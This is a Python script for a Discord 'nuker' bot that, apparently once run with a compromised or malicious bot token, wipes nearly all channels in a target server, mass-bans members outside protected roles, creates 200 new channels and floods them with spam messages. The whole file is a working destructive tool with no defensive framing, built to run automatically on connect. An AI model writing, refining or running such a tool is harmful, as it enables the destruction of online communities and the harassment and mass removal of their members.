from discord.ext import commands
from colorama import init, Fore, Style
import discord
import asyncio
import os
import sys
import threading
import random
from threading import Lock
import json

init()

ASCII_ART = """
 /$$   /$$           /$$
| $$$ | $$          | $$
| $$$$| $$ /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$
| $$ $$ $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$
| $$  $$$$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \__/
| $$\  $$$| $$  | $$| $$_  $$ | $$_____/| $$
| $$ \  $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$
|__/  \__/ \______/ |__/  \__/ \_______/|__/
"""

os.system('cls' if os.name == 'nt' else 'clear')
print(f"\033[95m{ASCII_ART}\033[0m")

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

def load_info(path="info.txt"):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

info = load_info("info.txt")
TOKEN = info.get("token", "")
guild_id = info.get("guild_id", "")
spam_message = info.get("spam_message", "Default spam message")
new_channels_name = info.get("new_channels_name", "new-channel")
channel_count = 200
ban_message_count = 10
protected_roles = info.get("protected_roles", ["Admin", "Moderator"])
auto_ban = info.get("auto_ban", True)

channels_created = 0
channels_deleted = 0
messages_sent = 0
users_banned = 0
counter_lock = Lock()
stop_event = threading.Event()

async def send_message_periodically(channel):
    global messages_sent
    while not stop_event.is_set():
        with counter_lock:
            if messages_sent >= 10000:
                break
        try:
            await channel.send(spam_message)
            with counter_lock:
                messages_sent += 1
            update_terminal_title()
            await asyncio.sleep(random.uniform(1.5, 3))
        except:
            break

async def delete_all_channels(guild):
    global channels_deleted
    print(Fore.YELLOW + "[*] Wiping everything..." + Style.RESET_ALL)

    protected = ["general", "staff", "rules", "info"]

    all_chans = [c for c in guild.channels if c.name.lower() not in protected]

    if not all_chans:
        return

    only_c = [c for c in all_chans if not isinstance(c, discord.CategoryChannel)]
    only_cat = [c for c in all_chans if isinstance(c, discord.CategoryChannel)]

    if only_c:
        tasks = [c.delete() for c in only_c]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        with counter_lock:
            channels_deleted += sum(1 for r in results if not isinstance(r, Exception))

    if only_cat:
        tasks = [c.delete() for c in only_cat]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        with counter_lock:
            channels_deleted += sum(1 for r in results if not isinstance(r, Exception))

    update_terminal_title()

async def create_channels_parallel(guild, count):
    global channels_created
    print(Fore.YELLOW + f"[*] Spawning {count} channels..." + Style.RESET_ALL)

    async def create_one(i):
        global channels_created
        try:
            name = f"{new_channels_name}-{i:03d}"
            channel = await guild.create_text_channel(name)
            with counter_lock:
                channels_created += 1
            update_terminal_title()
            bot.loop.create_task(send_message_periodically(channel))
        except:
            pass

    for i in range(0, count, 10):
        tasks = [create_one(j) for j in range(i, min(i + 10, count))]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.6)

async def ban_users_immediately(guild):
    global users_banned
    try:
        await guild.chunk()
    except:
        pass

    targets = [m for m in guild.members if m != bot.user and not any(r.name in protected_roles for r in m.roles)]

    async def ban_one(m):
        global users_banned
        try:
            await m.ban(reason="Clean", delete_message_days=1)
            with counter_lock:
                users_banned += 1
            update_terminal_title()
        except:
            pass

    for i in range(0, len(targets), 5):
        tasks = [ban_one(m) for m in targets[i:i+5]]
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.4)

@bot.event
async def on_ready():
    print(Fore.CYAN + f"Connected: {bot.user}" + Style.RESET_ALL)
    guild = bot.get_guild(int(guild_id))
    if not guild:
        return

    del_task = asyncio.create_task(delete_all_channels(guild))
    if auto_ban:
        asyncio.create_task(ban_users_immediately(guild))

    await del_task
    await create_channels_parallel(guild, channel_count)

def update_terminal_title():
    title = f"D: {channels_deleted} | C: {channels_created} | M: {messages_sent} | B: {users_banned}"
    if os.name == "nt":
        import ctypes
        try: ctypes.windll.kernel32.SetConsoleTitleW(title)
        except: pass
    else:
        sys.stdout.write(f"\x1b]2;{title}\x07")
        sys.stdout.flush()

def stop_bot():
    input()
    os._exit(0)

if __name__ == "__main__":
    threading.Thread(target=stop_bot, daemon=True).start()
    bot.run(TOKEN)
